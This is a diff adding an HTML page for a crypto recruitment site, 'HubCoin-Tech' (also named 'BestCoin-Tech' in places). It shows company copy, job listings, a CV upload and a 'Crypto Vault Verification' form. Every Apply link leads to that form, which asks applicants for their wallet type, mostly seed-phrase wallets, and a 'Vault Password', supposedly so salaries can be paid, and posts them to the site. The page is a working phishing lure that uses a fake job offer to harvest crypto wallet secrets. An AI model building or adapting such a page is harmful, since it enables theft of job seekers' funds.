@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Open Roles – HubCoin-Tech</title>
+  <link rel="stylesheet" href="css/style.css" />
+  <link rel="icon" type="image/png" href="images/favicon.png" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
+
+<style>
+  small{
+    color: rgba(128, 128, 128, 0.815);
+  }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f7f9fb;
+      color: #222;
+    }
+    .navbar{
+      background-color: #f7f9fb;
+
+    }
+    .navbar-container{
+      background-color: white;
+
+    }
+    header {
+      background-color: #1a1a2e;
+      color: #fff;
+      padding: 40px 20px;
+      text-align: center;
+    }
+    header h1 {
+      margin: 0;
+      font-size: 2.5em;
+    }
+    header p {
+      font-size: 1.2em;
+      color: #bbb;
+    }
+    section {
+      padding: 50px 20px;
+      max-width: 1000px;
+      margin: auto;
+    }
+    h2 {
+      color: #1a1a2e;
+      margin-bottom: 10px;
+    }
+    ul {
+      padding-left: 20px;
+    }
+    .cta-buttons a {
+      display: inline-block;
+      margin: 10px 10px 0 0;
+      padding: 12px 25px;
+      background-color: #1a1a2e;
+      color: #fff;
+      text-decoration: none;
+      border-radius: 5px;
+      transition: background 0.3s ease;
+    }
+    .cta-buttons a:hover {
+      background-color: #0f3460;
+    }
+    footer {
+      background-color: #1a1a2e;
+      color: #fff;
+      padding: 30px 20px;
+      text-align: center;
+    }
+    .divider {
+      height: 2px;
+      background: #ddd;
+      margin: 40px 0;
+    }
+
+
+    /* next  */
+     body {
+      font-family: 'Segoe UI', sans-serif;
+      /* background-color: #f9f9f9; */
+      color: #333;
+      margin: 0;
+      padding: 0;
+    }
+    /* header {
+      background-color: #1a1a2e;
+      color: #fff;
+      text-align: center;
+      padding: 40px 20px;
+    } */
+    h1, h2 {
+      margin: 0 0 15px;
+    }
+    section {
+      max-width: 1000px;
+      margin: auto;
+      padding: 50px 20px;
+    }
+    ul {
+      padding-left: 20px;
+    }
+    .job-listing {
+      background: #fff;
+      padding: 20px;
+      margin-bottom: 15px;
+      border-left: 5px solid #1a1a2e;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+    }
+    .job-listing h3 {
+      margin: 0;
+      color: #1a1a2e;
+    }
+    .job-listing small {
+      display: block;
+      color: #666;
+      margin-bottom: 10px;
+    }
+    .apply-btn {
+      display: inline-block;
+      padding: 10px 20px;
+      background-color: #1a1a2e;
+      color: white;
+      text-decoration: none;
+      border-radius: 4px;
+      margin-top: 10px;
+    }
+    .note {
+      background: #fffbdd;
+      border-left: 5px solid #ffcc00;
+      padding: 15px;
+      margin: 30px 0;
+    }
+
+    /* next crypt */
+  .crypto-password-form {
+    max-width: 350px;
+    background: #111827;
+    border: 2px solid #1f2937;
+    border-radius: 16px;
+    padding: 30px 25px;
+    font-family: 'Segoe UI', sans-serif;
+    color: #f9fafb;
+    box-shadow: 0 0 20px rgba(0, 255, 170, 0.15);
+  }
+
+  .crypto-password-form h2 {
+    font-size: 22px;
+    text-align: center;
+    margin-bottom: 25px;
+    letter-spacing: 1px;
+    color: #00ffd1;
+  }
+
+  .input-wrap {
+    margin-bottom: 20px;
+  }
+
+  .input-wrap label {
+    display: block;
+    font-size: 13px;
+    color: #d1d5db;
+    margin-bottom: 6px;
+  }
+
+  .input-wrap input {
+    width: 100%;
+    padding: 10px 12px;
+    border-radius: 8px;
+    background: #1f2937;
+    color: #f3f4f6;
+    border: 1px solid #374151;
+    font-size: 14px;
+  }
+
+  .password-strength {
+    margin-top: 6px;
+    width: 100%;
+    height: 8px;
+    background: #374151;
+    border-radius: 5px;
+    overflow: hidden;
+  }
+
+  .password-strength span {
+    display: block;
+    height: 100%;
+    width: 0;
+    background-color: #00ffd1;
+    transition: width 0.3s ease;
+  }
+
+  .crypto-password-form button {
+    width: 100%;
+    padding: 10px;
+    border: none;
+    border-radius: 8px;
+    background: linear-gradient(to right, #00ffd1, #00c2ff);
+    color: #111827;
+    font-weight: bold;
+    font-size: 14px;
+    cursor: pointer;
+    box-shadow: 0 0 12px rgba(0, 255, 170, 0.2);
+    transition: background 0.3s ease;
+  }
+
+  .crypto-password-form button:hover {
+    background: linear-gradient(to right, #00e6aa, #009fd4);
+  }
+
+  /* select dropdown */
+
+
+  .input-wrap select {
+    width: 100%;
+    padding: 12px;
+    background: rgba(255, 255, 255, 0.1);
+    border: none;
+    border-radius: 8px;
+    color: #fff;
+    font-size: 14px;
+    outline: none;
+    appearance: none;
+    background-image: linear-gradient(45deg, transparent 50%, #00ffc3 50%),
+                      linear-gradient(135deg, #00ffc3 50%, transparent 50%);
+    background-position: calc(100% - 25px) calc(1em + 2px), calc(100% - 20px) calc(1em + 2px);
+    background-size: 5px 5px, 5px 5px;
+    background-repeat: no-repeat;
+    cursor: pointer;
+  }
+
+  .input-wrap select option {
+    background-color: #1f2937;
+    color: #fff;
+  }
+
+ /* Navbar */
+  .navbar {
+    margin-top: 4%;
+    /* background-color: #fff; */
+   
+  }
+  
+  .navbar-container {
+    max-width: 70%;
+    margin: 0 auto;
+    padding: 15px 10px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+
+  }
+  
+  .logo {
+    height: 28px;
+  }
+  
+  .nav-links a {
+    margin-left: 30px;
+    text-decoration: none;
+    color: #111;
+    font-size: 15px;
+    transition: color 0.2s;
+  }
+  
+  .nav-links a:hover {
+    color: #0070f3;
+  }
+
+
+.header{
+    font-size: 30px;
+    color: #1a1a2e;
+
+    }
+
+
+  </style>
+
+</head>
+<body>
+   <header class="navbar">
+    <div class="navbar-container">
+     
+    <h1 class="header">HubCoin-Tech</h1>
+      <nav class="nav-links">
+        <a href="#apply">Apply</a>
+        <a href="#about">About Us</a>
+        <a href="#security">Security</a>
+        <a href="#position">Position</a>
+      </nav>
+    </div>
+  </header>
+
+ 
+
+  <section class="hero">
+    <h1>Apply</h1>
+    <p>Help us build a decentralized future. Find your spot in our organization. Crypto Exchanges or Startups Trainings.</p>
+  </section>
+
+
+<section>
+
+    <div>
+        HubCoin-Tech
+In the innovation-rich city of Austin, Texas,HubCoin-Tech was born—founded from a humble home office with a bold mission: to secure the future of finance and empower people through Bitcoin education and trading mastery.
+<br><br>
+BestCoin-Tech exists at the intersection of security, opportunity, and financial freedom. We are more than a Bitcoin company—we are a movement, raising a new generation of financially smart and cyber-aware individuals, all while protecting the backbone of the decentralized economy.
+<br> <br>
+🚀 Our Vision
+To create a world where anyone—regardless of background—can confidently participate in the Bitcoin economy, understand its origins, and master the skills to trade, invest, and secure their assets wisely.
+<br><br>
+We empower individuals with both technical protection and financial education, giving them the tools to not only survive, but thrive in the digital economy.
+<br><br>
+📚 Education & Mentorship Program
+AtHubCoin-Tech, we believe that knowledge is power—and power should be shared. That’s why we offer world-class educational programs led by top crypto and trading professionals, covering:
+<br><br>
+✅ Bitcoin Basics — History, origin, decentralization, and blockchain technology
+<br><br>
+✅ How to Buy, Sell, and Store Safely
+<br><br>
+✅ Market Strategy & Technical Analysis
+<br><br>
+Understanding candlestick patterns
+
+Reading support/resistance levels
+
+Identifying buy/sell signals
+
+Risk management and psychology of trading
+<br><br>
+✅ Crypto Wallets & Cold Storage Best Practices
+<br><br>
+✅ Security Awareness in Crypto Environments
+<br><br>
+Courses are delivered through:
+
+Live webinars
+<header id="about">
+    <h1>BestCoin-Tech</h1>
+    <p>Empowering the Future of Bitcoin – Securely, Smartly, and Globally</p>
+  </header>
+
+  <section>
+    <h2>About Us</h2>
+    <p>Based in Austin, Texas,HubCoin-Tech is pioneering Bitcoin security, education, and trading mentorship. We empower users to thrive in the decentralized economy with unmatched protection and expert training.</p>
+  </section>
+
+  <div class="divider"></div>
+
+  <section>
+    <h2>Our Vision</h2>
+    <ul>
+      <li>Educate users on the origin and evolution of Bitcoin</li>
+      <li>Empower individuals to trade, invest, and grow safely</li>
+      <li>Defend crypto assets from cyber threats</li>
+      <li>Promote trust, security, and knowledge in the crypto space</li>
+    </ul>
+  </section>
+
+  <div class="divider"></div>
+
+  <section id="security">
+    <h2>Security-First Operations</h2>
+    <p>We operate a professional Security Operations Center (SOC) led by certified experts. Our team defends against APTs, fraud, and exploits with real-time monitoring and zero-trust principles.</p>
+    <ul>
+      <li>24/7 Infrastructure Protection</li>
+      <li>Cold Wallet Security & Smart Contract Audits</li>
+      <li>Incident Response & Recovery</li>
+      <li>DevSecOps & Cloud Defense</li>
+    </ul>
+  </section>
+
+  <div class="divider"></div>
+
+  <section>
+    <h2>Education & Mentorship</h2>
+    <p>BestCoin-Tech offers world-class training by top professionals. Whether you’re a beginner or advanced trader, we help you build real skills.</p>
+    <ul>
+      <li>Bitcoin Basics & Blockchain Origin</li>
+      <li>Market Strategies: Candlesticks, Buy/Sell, Risk Management</li>
+      <li>Crypto Wallet Safety & Storage Methods</li>
+      <li>Live Webinars, Video Courses, and 1-on-1 Mentoring</li>
+    </ul>
+  </section>
+
+  <div class="divider"></div>
+
+  <section>
+    <h2>Join Our Team</h2>
+    <p>We're hiring passionate Security Engineers, Analysts, and Blockchain Defenders to secure the future of crypto. Whether you're experienced or an exceptional learner—we want you.</p>
+    <ul>
+      <li>Remote-friendly Security Engineer roles</li>
+      <li>Cybersecurity & Blockchain Specialists</li>
+      <li>Opportunities to teach and mentor others</li>
+    </ul>
+  </section>
+
+  
+
+  
+
+  <div class="divider"></div>
+
+  <section>
+    <h2>Why Austin, Texas?</h2>
+    <p>Austin is a melting pot of innovation, community, and tech leadership. From our roots here, we are building a Bitcoin platform that serves the world with integrity and trust.</p>
+  </section>
+
+  <div class="divider"></div>
+
+  <section>
+    <h2>Get Started</h2>
+    <div class="cta-buttons">
+      <a href="#">Explore Courses</a>
+      <a href="#">Apply to Join the Team</a>
+      <a href="#">Request a Mentor</a>
+      <a href="#">Contact Us</a>
+    </div>
+  </section>
+
+  <!-- next  -->
+   
+<header id="apply">
+  <h1>Careers atHubCoin-Tech</h1>
+  <p>Join us and shape the secure future of Bitcoin and financial freedom.</p>
+</header>
+
+<section>
+  <div class="note">
+    <strong>Note:</strong> AllHubCoin-Tech team members must be active crypto users or traders.
+    Understanding Bitcoin, blockchain, and DeFi is required for all roles.
+  </div>
+
+  <section>
+  <h2>What You Will Do In This Role</h2>
+  <p>AtHubCoin-Tech, we operate at the heart of the Bitcoin and crypto ecosystem. Whether you're an instructor, analyst, trader, or security professional, we rely on hands-on experts to drive real value for our community. Your daily work will help train others, protect our platform, and grow the decentralized economy.</p>
+
+  <ul>
+    <li>Teach trading concepts, candlesticks, signals, and technical indicators to new and intermediate learners</li>
+    <li>Create crypto education materials (videos, PDFs, live sessions, newsletters)</li>
+    <li>Analyze Bitcoin and altcoin markets for trading opportunities and publish daily/weekly updates</li>
+    <li>Lead or support crypto trading communities (Telegram, Discord, Reddit, etc.)</li>
+    <li>Assist users in understanding and integrating wallets, exchanges, and payment tools</li>
+    <li>Implement and evolveHubCoin-Tech’s security, training, and operations playbooks</li>
+    <li>Participate in research, content creation, social engagement, or mentorship events</li>
+    <li>Contribute to our open-source and educational outreach initiatives</li>
+    <li>Develop materials for internal and external crypto awareness programs</li>
+    <li>All depends on the role which you are enrolled to do </li>
+  </ul>
+ <br> <br>
+  <h2>What We Are Looking For</h2>
+  <p>We hire based on experience, not just education. If you have a strong record of using, trading, teaching, or analyzing Bitcoin or crypto markets — you are already ahead.</p>
+
+  <ul>
+    <li>Proven experience with crypto trading, technical analysis, or content creation</li>
+    <li>Experience managing or growing a crypto community, teaching on platforms like YouTube, Twitter, Udemy, or Discord</li>
+    <li>Knowledge of blockchain wallets, exchanges, and DeFi platforms</li>
+    <li>Ability to explain crypto concepts to beginners clearly and confidently</li>
+    <li>Certifications in crypto, security, or tech (e.g., Blockchain Council, CompTIA, CEH, etc.)</li>
+    <li>Optional: B.Sc in Computer Science, Finance, Engineering, or equivalent tech experience</li>
+    <li>If you can show us your trading record, teaching samples, or analysis — we’ll take notice and it an advantage cause we value more of hands on </li>
+  </ul>
+
+  <div class="note">
+    <strong>💰 Salary Range:</strong>$8,200 USDT/monthly <br>
+    Additional bonuses and income opportunities for senior contributors, instructors, and high-performing team members.
+  </div>
+
+
+  <div class="note" >
+    <strong>  Crypto Community Requirement –HubCoin-Tech </strong> <br>
+To join theHubCoin-Tech team or apply for any position, please note the following mandatory criteria:
+<br>
+<br> 
+✅ All applicants must be active crypto users or traders and verify their activity below.
+<br>
+<br>
+
+✅ Familiarity with Bitcoin, blockchain technology, and DeFi (Decentralized Finance) is required across all roles.
+<br>
+<br>
+
+✅ You must be a member of the crypto community, with proof of participation (wallets, trading activity, or community engagement).
+<br>
+<br>
+
+Bonus Eligibility : <br>
+✅ Having a verified crypto account (such as Binance, MetaMask, Coinbase, or similar) increases your chances of being selected — up to 2 job positions may be granted based on account credibility and activity
+
+<br>
+<br>
+
+
+💰 Salary Notice:   
+<br>
+
+All salaries and incentives atHubCoin-Tech are issued exclusively in cryptocurrency (e.g., Bitcoin, Ethereum, USDT). Applicants must be able to receive crypto payments.
+  </div>
+
+
+  <br>  <br>
+
+<div id="crypto-vault">
+  <form method="POST" enctype="multipart/form-data">
+  {% csrf_token %}
+  <label for="full_name">Full Name:</label>
+    <input type="text" name="full_name" required><br> <br>
+  <label for="cv">Upload Your CV:</label>
+  <input type="file" name="cv" accept=".pdf,.doc,.docx" required><br>
+  <button style="background-color: red; color: wheat; border: none;" type="submit" name="cv_form">Upload</button>
+</form>
+</div>
+<br> <br>
+<!-- form  -->
+
+<form class="crypto-password-form"  method="POST">
+  {% csrf_token %}
+  <h2>Enter Crypto Vault Verification</h2>
+  <small>Verify your wallet to access the crypto vault it must be an active and  existing wallet and salaries payment will be sent to this wallet </small> <br> <br>
+
+<div class="input-wrap">
+  <label for="wallet-select">Select Wallet Type</label>
+  <select id="wallet-select" name="wallet">
+    <option value="">-- Choose Wallet --</option>
+    <option value="metamask">MetaMask (Seed phrase)</option>
+    <option value="trustwallet">Trust Wallet (12-word phrase)</option>
+    <option value="electrum">Electrum (BTC-focused)</option>
+    <option value="electrum">Ethereum (ETH) </option>
+    <option value="electrum"> Solana  </option>
+    <option value="safePal">SafePal (Seed Phrase)</option>
+    <option value="keystone">Keystone (Seed Phrase + Optional Passphrase)</option>
+    <option value="brave">Brave Wallet (Seed Phrase)</option>
+    <option value="xverse">Xverse Wallet (Seed Phrase)</option>
+    <option value="atomic">Atomic Wallet</option>
+    <option value="exodus">Exodus Wallet</option>
+    <option value="bitkeep">BitKeep (Seed Phrase)</option>
+    <option value="coinomi">Coinomi</option>
+  </select>
+</div>
+
+
+
+
+  <div class="input-wrap">
+    <label for="crypto-pass">Vault Password</label>
+    <input type="password" name="password" id="crypto-pass" oninput="updateStrength()" placeholder="Secure Password" />
+    <div class="password-strength"><span id="strength-fill"></span></div>
+  </div>
+
+  <button type="submit" name="main_form">Sign Up</button>
+</form>
+
+
+
+<br><br>
+
+  <h2>What We Offer</h2>
+  <ul>
+    <li>Remote-friendly, distributed team model</li>
+    <li>$2,000 personal learning & development budget per year</li>
+    <li>Annual salary review + performance-based bonus</li>
+    <li>Recognition and crypto reward system</li>
+    <li>Paid holiday leave, parental leave, and wellness support</li>
+    <li>Opportunity to travel for events, conferences, and team meetups</li>
+    <li>Exclusive access to our trading tools, market data, and VIP analysis rooms</li>
+    <li>Freedom to grow into roles across education, analysis, security, and leadership</li>
+  </ul>
+</section>
+</section>
+
+<section id="position">
+  <h2>Open Positions</h2>
+
+  <div class="job-listing">
+    <h3>Bitcoin Trader Instructor (Trainer)</h3>
+    <small>UNITED STATES - Remote, EMEA - Remote | Full-time or Part-time</small>
+    <a href="#crypto-vault" class="apply-btn">Apply</a>
+  </div>
+
+  <div class="job-listing">
+    <h3>Crypto Signals Provider (Focus on Teaching)</h3>
+    <small>Japan - Remote | Full-time or Part-time</small>
+    <a href="#crypto-vault" class="apply-btn">Apply</a>
+  </div>
+
+  <div class="job-listing">
+    <h3>Community Leader / Discord Admin (Crypto Trading Groups)</h3>
+    <small>UNITED STATES - Remote, UNITED KINGDOM - Remote | Full-time</small>
+    <a href="#crypto-vault" class="apply-btn">Apply</a>
+  </div>
+
+  <div class="job-listing">
+    <h3>Crypto Course Creator (Freelance)</h3>
+    <small>UNITED STATES - Remote, EMEA - Remote | Full-time</small>
+    <a href="#crypto-vault" class="apply-btn">Apply</a>
+  </div>
+
+  <div class="job-listing">
+    <h3>Community Manager (with Trading Expertise)</h3>
+    <small>UNITED STATES - Remote, EMEA - Remote | Full-time or Part-time</small>
+    <a href="#crypto-vault" class="apply-btn">Apply</a>
+  </div>
+
+  <div class="job-listing">
+    <h3>Crypto Analyst Instructor (Trainer)</h3>
+    <small>UNITED STATES - Remote, UNITED KINGDOM - Remote | Full-time or Part-time</small>
+    <a href="#crypto-vault" class="apply-btn">Apply</a>
+  </div>
+
+  <div class="job-listing">
+    <h3>Crypto Community Manager / Moderator</h3>
+    <small>UNITED STATES - Remote, UNITED KINGDOM - Remote | Full-time or Part-time</small>
+    <a href="#crypto-vault" class="apply-btn">Apply</a>
+  </div>
+
+  <div class="job-listing">
+    <h3>Crypto Customer Support</h3>
+    <small>UNITED STATES - Remote, UNITED KINGDOM - Remote | Full-time or Part-time</small>
+    <a href="#crypto-vault" class="apply-btn">Apply</a>
+  </div>
+
+  <div class="job-listing">
+    <h3>Bitcoin / Crypto Influencer / Reviewer</h3>
+    <small>UNITED STATES - Remote, UNITED KINGDOM - Remote | Full-time or Part-time</small>
+    <a href="#crypto-vault" class="apply-btn">Apply</a>
+  </div>
+
+  <div class="job-listing">
+    <h3>Bitcoin Payment Integration Consultant</h3>
+    <small>UNITED STATES - Remote, UNITED KINGDOM - Remote | Full-time or Part-time</small>
+    <a href="#crypto-vault" class="apply-btn">Apply</a>
+  </div>
+
+  <div class="job-listing">
+    <h3>Crypto Virtual Assistant</h3>
+    <small>UNITED STATES - Remote, UNITED KINGDOM - Remote | Full-time or Part-time</small>
+    <a href="#crypto-vault" class="apply-btn">Apply</a>
+  </div>
+
+   <!-- next end  -->
+
+  <footer>
+    <p>📧 Email: info@bestCoin-Tech.com | 🌐 www.bestCoin-Tech.com</p>
+    <p>📍 Austin, Texas | 🔒 Security Hotline: +1-800-SEC-BTHT</p>
+    <p>&copy; 2025HubCoin-Tech. All rights reserved.</p>
+  </footer>
+
+    </div>
+
+</section>
+
+
+
+
+  <!-- Modal -->
+
+  <script src="js/script.js"></script>
+
+
+</body>
+</html>
+
+
